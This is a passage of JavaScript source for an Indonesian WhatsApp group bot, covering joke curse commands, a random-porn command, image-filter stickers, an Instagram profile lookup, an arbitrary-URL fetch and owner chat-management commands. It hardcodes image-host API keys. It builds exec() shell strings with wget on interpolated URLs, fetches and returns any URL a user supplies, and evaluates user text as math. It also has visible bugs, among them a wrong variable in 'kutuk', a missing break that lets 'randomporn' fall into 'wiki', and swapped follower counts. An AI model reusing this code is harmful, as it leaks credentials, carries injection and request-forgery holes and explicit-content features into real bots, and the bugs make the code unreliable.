               rjppp = teks[Math.floor(Math.random() * teks.length)];
               wokwik = rjppp.data
               reply(mess.success)
               await sleep(1000)
sendMediaURL(from, wokwik)
              await limitAdd(sender)
break
case 'santet':
                    sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag member yang mau disantet\n\nContoh : /santet @tag | kalo berak kaga di siram')
                    if (args.length === 1) return reply(from, 'Masukkan alasan kenapa menyantet dia!!\n\nContoh : /santet @tag | kalo berak kaga di siram', id)
                    const terima1 = santet[Math.floor(Math.random() * (santet.length))]
                    const target = arg.split('|')[0]
                    const alasan = arg.split('|')[1]
              teks = `Santet terkirim ke ${target}, Dengan alasan${alasan}\n\nJenis Santet Yang di Terima Korban adalah *${terima1}*`
              mentions(teks, true)
              await limitAdd(sender)
break

                case 'kutuk':
                    sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag member yang mau disantet\n\nContoh : /santet @tag | kalo berak kaga di siram')
                    if (args.length === 1) return dha.reply(from, 'Masukkan alasan kenapa menyantet dia!!\n\nContoh : /kutuk @tag | kalo berak kaga di siram', id)
                    const terima2 = kutuk[Math.floor(Math.random() * (kutuk.length))]
                    const target2 = arg.split('|')[0]
                    const alasan2 = arg.split('|')[1]
                    teks = `Santet terkirim ke ${target2}, Dengan alasan${alasan2}\n\nJenis Santet Yang di Terima Korban adalah *${terima1}*`
              mentions(teks, true)
                    await limitAdd(sender)
break
        case 'randomporn':
              case 'randomporn':
              case 'randomporn':
              sticWait(from)
					        
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              teks = await fetchJson(`https://raw.githubusercontent.com/Katashihana/RANDOM-BY-KATASHI/master/random.json`)
              sticWait(from)
              await sleep(1000)
               rjppp = teks[Math.floor(Math.random() * teks.length)];
               wokwik = rjppp.data.url
               reply(mess.success)
               await sleep(1000)
sendMediaURL(from, wokwik);;
case 'wiki': 
case 'wikipedia':
  sticWait(from)
  if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
sticWait(from)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
await limitAdd(sender)
break

              case 'trigger':
              if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
					case 'sampah':
					if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 owgi = await dha.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					dha.sendMessage(from, buffer, image, {quoted: mek})
                   }
              await limitAdd(sender)
break       
		case 'gay':
		if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
		case 'glass':
		if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
		case 'passed':
		if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
		case 'jail':
		if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
		case 'comrade':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break
		case 'hijau':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break 
		case 'biru':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 await limitAdd(sender)
break 
		case 'greyscale':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break 
		case 'invert':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break 
		case 'invert_greyscale':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break 
		case 'red':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break
         case 'blurple':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break 
		case 'blurple2':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 await limitAdd(sender)
break 
		case 'wasted':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break 
		case 'pelangi':
		case 'rainbow':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break 
		case 'sepia':
  sticWait(from)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  dha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					dha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender)
break 
					case "igstalk":
        if (isBanned) return reply('Lu udh kena ban')
        if (!q) return reply("Usernamenya?")
        ig.fetchUser(args[0]).then((Y) => {
          console.log(args[0]);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Following* : ${Y.followers}\n*Followers* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        
await limitAdd(sender)
break;
case 'unpin':
                if (!isOwner) return reply(mess.only.owner)
                dha.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                await limitAdd(sender)
break
            
             case 'archive':
                if (!isOwner) return reply(mess.only.owner)
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                dha.modifyChat(from, ChatModification.archive)
                await limitAdd(sender)
break
            case 'unreadall':
                if (!isOwner) return reply(mess.only.owner)
                var chats = await dha.chats.all()
                chats.map( async ({ jid }) => {
                await dha.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await dha.sendMessage(from, teks, text, {quoted: mek})
		    console.log(chats.length)
	        await limitAdd(sender)
break
            case 'readall':
                if (!isOwner) return reply(mess.only.owner)
                var chats = await dha.chats.all()
                chats.map( async ({ jid }) => {
                await dha.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await dha.sendMessage(from, teks, text, {quoted: mek})
		console.log(chats.length)
		await limitAdd(sender)
break
            case 'unarchiveall':
                if (!isOwner) return reply(mess.only.owner)
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await dha.chats.all()
                for (let _ of anu) {
                dha.modifyChat(_.jid, ChatModification.unarchive)
                }
                await limitAdd(sender)
break
case 'get2':
case 'fetch2':
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
            if(!q) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            await limitAdd(sender)
break
				case 'kalkulator':
				if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 await limitAdd(sender)
break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                dha.modifyChat(from, ChatModification.delete)
                await limitAdd(sender)
break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					anu = await dha.chats.all()
					dha.setMaxListeners(10)
					for (let _ of anu) {
						dha.clearMessage(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					await limitAdd(sender)
break
					case 'creategroup':
			case 'creategrup':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					dha.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				await limitAdd(sender)
break
case 'emoji':
if (args.length == 0) return reply(`Example: ${prefix + command} wa 🗿

*LIST EMOJI*

ap = Emoji Apple
wa = Emoji Whatsapp
fb = Emoji Facebook
go = Emoji Google
mo = Emoji Mozilla
tw = Emoji Twitter
sa = Emoji Samsung

penggunaan : ${prefix + command } wa 🗿`)
             emojis = args[0]
            args.shift()
            emoje = args.join(" ")
           sticWait(from)
           switch (emojis) {
           case 'ap':
           case 'apple':
			emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[0].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
                    await limitAdd(sender)
break
              case 'wa':
              case 'whatsapp':
              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[4].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
             case 'fb':
              case 'facebook':
              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[6].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
             case 'go':
              case 'google':
              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[1].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
            case 'mo':
              case 'mozila':
              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[14].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
              case 'tw':
              case 'twitter':
              emoji.get(`${emoje}`).then(emoji => {
				teks = `${emoji.images[5].url}`
    			sendWebp(from,`${teks}`)	
    			console.log(teks)
   				})
              await limitAdd(sender)
break
              case 'sa':
              case 'samsung':
